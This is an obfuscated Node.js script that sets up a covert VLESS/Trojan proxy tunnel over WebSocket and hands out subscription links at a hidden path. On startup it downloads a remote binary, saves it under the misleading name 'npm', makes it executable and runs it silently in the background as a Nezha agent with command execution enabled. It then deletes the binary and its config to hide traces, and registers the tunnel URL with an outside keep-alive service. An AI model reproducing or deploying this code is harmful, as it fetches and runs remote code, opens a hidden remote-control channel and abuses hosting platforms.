const _0x3ee137=_0x38a3;(function(_0x11ed96,_0x4af81d){const _0x50ebaf=_0x38a3,_0x295cd5=_0x11ed96();while(!![]){try{const _0x4d3afa=-parseInt(_0x50ebaf(0x1c8))/0x1*(parseInt(_0x50ebaf(0x1bc))/0x2)+-parseInt(_0x50ebaf(0x1b2))/0x3+-parseInt(_0x50ebaf(0x1cd))/0x4*(-parseInt(_0x50ebaf(0x204))/0x5)+parseInt(_0x50ebaf(0x225))/0x6*(-parseInt(_0x50ebaf(0x208))/0x7)+-parseInt(_0x50ebaf(0x1cb))/0x8+-parseInt(_0x50ebaf(0x1b8))/0x9+parseInt(_0x50ebaf(0x1d4))/0xa;if(_0x4d3afa===_0x4af81d)break;else _0x295cd5['push'](_0x295cd5['shift']());}catch(_0x473202){_0x295cd5['push'](_0x295cd5['shift']());}}}(_0x2137,0xdc0e2));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x3ee137(0x1ef)),net=require('net'),path=require(_0x3ee137(0x1ea)),crypto=require('crypto'),{Buffer}=require(_0x3ee137(0x205)),{exec,execSync}=require(_0x3ee137(0x20f)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3ee137(0x1d0)][_0x3ee137(0x21b)]||_0x3ee137(0x218),NEZHA_SERVER=process['env'][_0x3ee137(0x1c2)]||'',NEZHA_PORT=process['env'][_0x3ee137(0x1f3)]||'',NEZHA_KEY=process[_0x3ee137(0x1d0)][_0x3ee137(0x226)]||'',DOMAIN=process['env'][_0x3ee137(0x1df)]||_0x3ee137(0x1b9),AUTO_ACCESS=process[_0x3ee137(0x1d0)][_0x3ee137(0x223)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x3ee137(0x207)](0x0,0x8),SUB_PATH=process[_0x3ee137(0x1d0)]['SUB_PATH']||_0x3ee137(0x1c0),NAME=process['env'][_0x3ee137(0x1f6)]||'HugMe',PORT=process[_0x3ee137(0x1d0)][_0x3ee137(0x1d7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1092ad=_0x3ee137;try{const _0x1b49b9=await axios[_0x1092ad(0x20a)]('https://speed.cloudflare.com/meta'),_0x3bdae8=_0x1b49b9[_0x1092ad(0x228)];ISP=(_0x3bdae8[_0x1092ad(0x1be)]+'-'+_0x3bdae8[_0x1092ad(0x1e5)])[_0x1092ad(0x1ce)](/ /g,'_');}catch(_0xb8f812){ISP=_0x1092ad(0x1c6);}};GetISP();const httpServer=http['createServer']((_0xe42f47,_0x3f3187)=>{const _0x2a0ed1=_0x3ee137;if(_0xe42f47[_0x2a0ed1(0x210)]==='/'){const _0x14cdad=path[_0x2a0ed1(0x1f0)](__dirname,_0x2a0ed1(0x1c7));fs['readFile'](_0x14cdad,_0x2a0ed1(0x21d),(_0x4d6e8e,_0xe6a493)=>{const _0x422680=_0x2a0ed1;if(_0x4d6e8e){_0x3f3187[_0x422680(0x212)](0xc8,{'Content-Type':_0x422680(0x1e4)}),_0x3f3187[_0x422680(0x1dd)]('Hello\x20world!');return;}_0x3f3187[_0x422680(0x212)](0xc8,{'Content-Type':'text/html'}),_0x3f3187[_0x422680(0x1dd)](_0xe6a493);});return;}else{if(_0xe42f47[_0x2a0ed1(0x210)]==='/'+SUB_PATH){const _0x3f29a7=_0x2a0ed1(0x1bb)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2a0ed1(0x22a)+WSPATH+'#'+NAME+'-'+ISP,_0x5ec89e='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x2a0ed1(0x21a)+DOMAIN+_0x2a0ed1(0x22a)+WSPATH+'#'+NAME+'-'+ISP,_0x293a0f=_0x3f29a7+'\x0a'+_0x5ec89e,_0x418da5=Buffer[_0x2a0ed1(0x1d5)](_0x293a0f)['toString']('base64');_0x3f3187[_0x2a0ed1(0x212)](0xc8,{'Content-Type':_0x2a0ed1(0x1c9)}),_0x3f3187['end'](_0x418da5+'\x0a');}else _0x3f3187[_0x2a0ed1(0x212)](0x194,{'Content-Type':'text/plain'}),_0x3f3187[_0x2a0ed1(0x1dd)](_0x2a0ed1(0x200));}}),wss=new WebSocket[(_0x3ee137(0x1fb))]({'server':httpServer}),uuid=UUID[_0x3ee137(0x1ce)](/-/g,''),DNS_SERVERS=[_0x3ee137(0x227),_0x3ee137(0x1e9)];function resolveHost(_0x368cbf){return new Promise((_0x2a75ca,_0x37ff64)=>{const _0x45ffd6=_0x38a3;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x45ffd6(0x1dc)](_0x368cbf)){_0x2a75ca(_0x368cbf);return;}let _0x2bbc53=0x0;function _0x7eb214(){const _0xc5fa58=_0x45ffd6;if(_0x2bbc53>=DNS_SERVERS[_0xc5fa58(0x1cf)]){_0x37ff64(new Error(_0xc5fa58(0x21e)+_0x368cbf+_0xc5fa58(0x1d9)));return;}const _0x50d1e5=DNS_SERVERS[_0x2bbc53];_0x2bbc53++;const _0x1465e3=_0xc5fa58(0x1fc)+encodeURIComponent(_0x368cbf)+_0xc5fa58(0x1bf);axios[_0xc5fa58(0x20a)](_0x1465e3,{'timeout':0x1388,'headers':{'Accept':_0xc5fa58(0x1d2)}})['then'](_0x9202db=>{const _0x3d512f=_0xc5fa58,_0x596c4e=_0x9202db[_0x3d512f(0x228)];if(_0x596c4e[_0x3d512f(0x21c)]===0x0&&_0x596c4e[_0x3d512f(0x1fd)]&&_0x596c4e[_0x3d512f(0x1fd)][_0x3d512f(0x1cf)]>0x0){const _0x287aec=_0x596c4e['Answer']['find'](_0x1f6b27=>_0x1f6b27[_0x3d512f(0x1f1)]===0x1);if(_0x287aec){_0x2a75ca(_0x287aec[_0x3d512f(0x228)]);return;}}_0x7eb214();})[_0xc5fa58(0x1ee)](_0x28a4cb=>{_0x7eb214();});}_0x7eb214();});}function handleVlessConnection(_0x20aabc,_0x50de24){const _0x29b5f6=_0x3ee137,[_0x1ba5fe]=_0x50de24,_0x11d254=_0x50de24['slice'](0x1,0x11);if(!_0x11d254[_0x29b5f6(0x1f9)]((_0xca5de3,_0x85acac)=>_0xca5de3==parseInt(uuid[_0x29b5f6(0x1db)](_0x85acac*0x2,0x2),0x10)))return![];let _0x2ebefa=_0x50de24[_0x29b5f6(0x207)](0x11,0x12)[_0x29b5f6(0x1d6)]()+0x13;const _0x580920=_0x50de24[_0x29b5f6(0x207)](_0x2ebefa,_0x2ebefa+=0x2)['readUInt16BE'](0x0),_0x207f76=_0x50de24[_0x29b5f6(0x207)](_0x2ebefa,_0x2ebefa+=0x1)[_0x29b5f6(0x1d6)](),_0x2622e1=_0x207f76==0x1?_0x50de24['slice'](_0x2ebefa,_0x2ebefa+=0x4)[_0x29b5f6(0x1f0)]('.'):_0x207f76==0x2?new TextDecoder()[_0x29b5f6(0x1cc)](_0x50de24[_0x29b5f6(0x207)](_0x2ebefa+0x1,_0x2ebefa+=0x1+_0x50de24[_0x29b5f6(0x207)](_0x2ebefa,_0x2ebefa+0x1)[_0x29b5f6(0x1d6)]())):_0x207f76==0x3?_0x50de24['slice'](_0x2ebefa,_0x2ebefa+=0x10)[_0x29b5f6(0x1c1)]((_0x12b0de,_0x3d89cd,_0x1ffa7e,_0x559250)=>_0x1ffa7e%0x2?_0x12b0de[_0x29b5f6(0x1b7)](_0x559250[_0x29b5f6(0x207)](_0x1ffa7e-0x1,_0x1ffa7e+0x1)):_0x12b0de,[])[_0x29b5f6(0x1ca)](_0x295b8d=>_0x295b8d['readUInt16BE'](0x0)['toString'](0x10))[_0x29b5f6(0x1f0)](':'):'';_0x20aabc[_0x29b5f6(0x1eb)](new Uint8Array([_0x1ba5fe,0x0]));const _0x416b6b=createWebSocketStream(_0x20aabc);return resolveHost(_0x2622e1)[_0x29b5f6(0x20c)](_0x1f4b95=>{const _0x136f0a=_0x29b5f6;net[_0x136f0a(0x20e)]({'host':_0x1f4b95,'port':_0x580920},function(){const _0x2ba222=_0x136f0a;this[_0x2ba222(0x1e8)](_0x50de24[_0x2ba222(0x207)](_0x2ebefa)),_0x416b6b['on'](_0x2ba222(0x1de),()=>{})[_0x2ba222(0x1fa)](this)['on'](_0x2ba222(0x1de),()=>{})['pipe'](_0x416b6b);})['on']('error',()=>{});})['catch'](_0x32d174=>{const _0x290463=_0x29b5f6;net[_0x290463(0x20e)]({'host':_0x2622e1,'port':_0x580920},function(){const _0x1f4ae9=_0x290463;this[_0x1f4ae9(0x1e8)](_0x50de24['slice'](_0x2ebefa)),_0x416b6b['on'](_0x1f4ae9(0x1de),()=>{})[_0x1f4ae9(0x1fa)](this)['on'](_0x1f4ae9(0x1de),()=>{})[_0x1f4ae9(0x1fa)](_0x416b6b);})['on'](_0x290463(0x1de),()=>{});}),!![];}function handleTrojanConnection(_0x176fdd,_0x5323f8){const _0x475bc=_0x3ee137;try{if(_0x5323f8[_0x475bc(0x1cf)]<0x3a)return![];const _0x201f9d=_0x5323f8[_0x475bc(0x207)](0x0,0x38)[_0x475bc(0x1f8)](),_0x464d1d=[UUID];let _0x261615=null;for(const _0x3dc369 of _0x464d1d){const _0x3ac2da=crypto['createHash'](_0x475bc(0x20d))[_0x475bc(0x1b3)](_0x3dc369)[_0x475bc(0x1d1)]('hex');if(_0x3ac2da===_0x201f9d){_0x261615=_0x3dc369;break;}}if(!_0x261615)return![];let _0x58625a=0x38;_0x5323f8[_0x58625a]===0xd&&_0x5323f8[_0x58625a+0x1]===0xa&&(_0x58625a+=0x2);const _0x285490=_0x5323f8[_0x58625a];if(_0x285490!==0x1)return![];_0x58625a+=0x1;const _0x4b9116=_0x5323f8[_0x58625a];_0x58625a+=0x1;let _0x420fe2,_0x58bebb;if(_0x4b9116===0x1)_0x420fe2=_0x5323f8[_0x475bc(0x207)](_0x58625a,_0x58625a+0x4)[_0x475bc(0x1f0)]('.'),_0x58625a+=0x4;else{if(_0x4b9116===0x3){const _0x419022=_0x5323f8[_0x58625a];_0x58625a+=0x1,_0x420fe2=_0x5323f8[_0x475bc(0x207)](_0x58625a,_0x58625a+_0x419022)[_0x475bc(0x1f8)](),_0x58625a+=_0x419022;}else{if(_0x4b9116===0x4)_0x420fe2=_0x5323f8[_0x475bc(0x207)](_0x58625a,_0x58625a+0x10)['reduce']((_0x4e95e4,_0x5f1e25,_0x23a377,_0x1a71d7)=>_0x23a377%0x2?_0x4e95e4[_0x475bc(0x1b7)](_0x1a71d7[_0x475bc(0x207)](_0x23a377-0x1,_0x23a377+0x1)):_0x4e95e4,[])[_0x475bc(0x1ca)](_0x30d56e=>_0x30d56e['readUInt16BE'](0x0)[_0x475bc(0x1f8)](0x10))['join'](':'),_0x58625a+=0x10;else return![];}}_0x58bebb=_0x5323f8['readUInt16BE'](_0x58625a),_0x58625a+=0x2;_0x58625a<_0x5323f8[_0x475bc(0x1cf)]&&_0x5323f8[_0x58625a]===0xd&&_0x5323f8[_0x58625a+0x1]===0xa&&(_0x58625a+=0x2);const _0x122acf=createWebSocketStream(_0x176fdd);return resolveHost(_0x420fe2)['then'](_0x4d95d5=>{const _0x25663=_0x475bc;net[_0x25663(0x20e)]({'host':_0x4d95d5,'port':_0x58bebb},function(){const _0x4eac8c=_0x25663;_0x58625a<_0x5323f8[_0x4eac8c(0x1cf)]&&this[_0x4eac8c(0x1e8)](_0x5323f8[_0x4eac8c(0x207)](_0x58625a)),_0x122acf['on']('error',()=>{})[_0x4eac8c(0x1fa)](this)['on'](_0x4eac8c(0x1de),()=>{})[_0x4eac8c(0x1fa)](_0x122acf);})['on']('error',()=>{});})[_0x475bc(0x1ee)](_0x340184=>{const _0x3b81bb=_0x475bc;net[_0x3b81bb(0x20e)]({'host':_0x420fe2,'port':_0x58bebb},function(){const _0x14d54b=_0x3b81bb;_0x58625a<_0x5323f8[_0x14d54b(0x1cf)]&&this[_0x14d54b(0x1e8)](_0x5323f8[_0x14d54b(0x207)](_0x58625a)),_0x122acf['on']('error',()=>{})[_0x14d54b(0x1fa)](this)['on'](_0x14d54b(0x1de),()=>{})[_0x14d54b(0x1fa)](_0x122acf);})['on'](_0x3b81bb(0x1de),()=>{});}),!![];}catch(_0x564a85){return![];}}function _0x2137(){const _0x1dffa0=['NAME','split','toString','every','pipe','Server','https://dns.google/resolve?name=','Answer','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','message','Not\x20Found\x0a','connection','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','once','95kjUBdx','buffer','includes','slice','7kNxszy','finish','get','\x20-p\x20','then','sha224','connect','child_process','url','npm\x20download\x20successfully','writeHead','unlink','443','npm','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Automatic\x20Access\x20Task\x20added\x20successfully','40087451-ffa0-420c-8739-884a8f2bfe86','2096','&fp=chrome&type=ws&host=','UUID','Status','utf8','Failed\x20to\x20resolve\x20','createWriteStream','application/json','utf-8','log','AUTO_ACCESS','2083','8725872rAEVGb','NEZHA_KEY','8.8.4.4','data','trim','&path=%2F','1865619AApeid','update','error:\x20','post','arm64','concat','7490034vWyHhd','zonest.ggff.net','arm','vless://','218QsFzxG','close','country','&type=A','app','reduce','NEZHA_SERVER','true','https://arm64.ssss.nyc.mn/v1','listen','Unknown','index.html','5647MMiCpu','text/plain','map','1734816qiTBZJ','decode','113612gEGido','replace','length','env','digest','application/dns-json','setsid\x20nohup\x20./npm\x20-s\x20','41024750nHmSkc','from','readUInt8','PORT','https://amd64.ssss.nyc.mn/agent','\x20with\x20all\x20DNS\x20servers','npm\x20is\x20running','substr','test','end','error','DOMAIN','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','npm\x20running\x20error:','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','text/html','asOrganization','https://arm64.ssss.nyc.mn/agent','chmod\x20+x\x20npm','write','1.1.1.1','path','send','/bin/bash','stream','catch','axios','join','type','arch','NEZHA_PORT','client_secret:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'];_0x2137=function(){return _0x1dffa0;};return _0x2137();}function _0x38a3(_0x189fa8,_0x7b423d){const _0x2137cd=_0x2137();return _0x38a3=function(_0x38a3c4,_0x4cf76e){_0x38a3c4=_0x38a3c4-0x1b2;let _0x5e6c85=_0x2137cd[_0x38a3c4];return _0x5e6c85;},_0x38a3(_0x189fa8,_0x7b423d);}wss['on'](_0x3ee137(0x201),(_0x18de75,_0x403c14)=>{const _0x316232=_0x3ee137,_0x592901=_0x403c14[_0x316232(0x210)]||'';_0x18de75[_0x316232(0x203)](_0x316232(0x1ff),_0x7984ee=>{const _0x1491bb=_0x316232;if(_0x7984ee[_0x1491bb(0x1cf)]>0x11&&_0x7984ee[0x0]===0x0){const _0x1ab82e=_0x7984ee[_0x1491bb(0x207)](0x1,0x11),_0xe03adb=_0x1ab82e[_0x1491bb(0x1f9)]((_0x2adf30,_0x50b4dd)=>_0x2adf30==parseInt(uuid[_0x1491bb(0x1db)](_0x50b4dd*0x2,0x2),0x10));if(_0xe03adb){!handleVlessConnection(_0x18de75,_0x7984ee)&&_0x18de75[_0x1491bb(0x1bd)]();return;}}!handleTrojanConnection(_0x18de75,_0x7984ee)&&_0x18de75[_0x1491bb(0x1bd)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x139ae5=_0x3ee137,_0xbf48e7=os[_0x139ae5(0x1f2)]();return _0xbf48e7===_0x139ae5(0x1ba)||_0xbf48e7===_0x139ae5(0x1b6)||_0xbf48e7==='aarch64'?!NEZHA_PORT?_0x139ae5(0x1c4):_0x139ae5(0x1e6):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x139ae5(0x1d8);},downloadFile=async()=>{const _0x216056=_0x3ee137;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x171103=getDownloadUrl(),_0x10dc03=await axios({'method':_0x216056(0x20a),'url':_0x171103,'responseType':_0x216056(0x1ed)}),_0x3d52bf=fs[_0x216056(0x21f)](_0x216056(0x215));return _0x10dc03['data'][_0x216056(0x1fa)](_0x3d52bf),new Promise((_0x59b133,_0x229d30)=>{const _0x19177f=_0x216056;_0x3d52bf['on'](_0x19177f(0x209),()=>{const _0x899e9a=_0x19177f;console[_0x899e9a(0x222)](_0x899e9a(0x211)),exec(_0x899e9a(0x1e7),_0x458dd2=>{if(_0x458dd2)_0x229d30(_0x458dd2);_0x59b133();});}),_0x3d52bf['on']('error',_0x229d30);});}catch(_0x4f9649){throw _0x4f9649;}},runnz=async()=>{const _0x218b21=_0x3ee137;try{const _0x3870e0=execSync(_0x218b21(0x1e0),{'encoding':_0x218b21(0x221)});if(_0x3870e0[_0x218b21(0x229)]()!==''){console[_0x218b21(0x222)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2c3d18){}await downloadFile();let _0x314ae3='',_0x3a4c1d=[_0x218b21(0x214),'8443',_0x218b21(0x219),'2087',_0x218b21(0x224),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x27bf08=_0x3a4c1d[_0x218b21(0x206)](NEZHA_PORT)?'--tls':'';_0x314ae3=_0x218b21(0x1d3)+NEZHA_SERVER+':'+NEZHA_PORT+_0x218b21(0x20b)+NEZHA_KEY+'\x20'+_0x27bf08+_0x218b21(0x216);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3334fa=NEZHA_SERVER[_0x218b21(0x206)](':')?NEZHA_SERVER[_0x218b21(0x1f7)](':')['pop']():'',_0x4d8593=_0x3a4c1d[_0x218b21(0x206)](_0x3334fa)?_0x218b21(0x1c3):'false',_0x4de81f=_0x218b21(0x1f4)+NEZHA_KEY+_0x218b21(0x1f5)+NEZHA_SERVER+_0x218b21(0x1fe)+_0x4d8593+_0x218b21(0x202)+UUID;fs['writeFileSync']('config.yaml',_0x4de81f);}_0x314ae3=_0x218b21(0x1e1);}else{console[_0x218b21(0x222)](_0x218b21(0x1e3));return;}}try{exec(_0x314ae3,{'shell':_0x218b21(0x1ec)},_0x386abe=>{const _0x3e02d5=_0x218b21;if(_0x386abe)console[_0x3e02d5(0x1de)](_0x3e02d5(0x1e2),_0x386abe);else console[_0x3e02d5(0x222)](_0x3e02d5(0x1da));});}catch(_0x215da9){console[_0x218b21(0x1de)](_0x218b21(0x1b4)+_0x215da9);}};async function addAccessTask(){const _0x2a44fe=_0x3ee137;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x26e101='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x20ab55=await axios[_0x2a44fe(0x1b5)]('https://oooo.serv00.net/add-url',{'url':_0x26e101},{'headers':{'Content-Type':_0x2a44fe(0x220)}});console['log'](_0x2a44fe(0x217));}catch(_0x56f2f3){}}const delFiles=()=>{const _0x5b7a03=_0x3ee137;fs[_0x5b7a03(0x213)](_0x5b7a03(0x215),()=>{}),fs[_0x5b7a03(0x213)]('config.yaml',()=>{});};httpServer[_0x3ee137(0x1c5)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
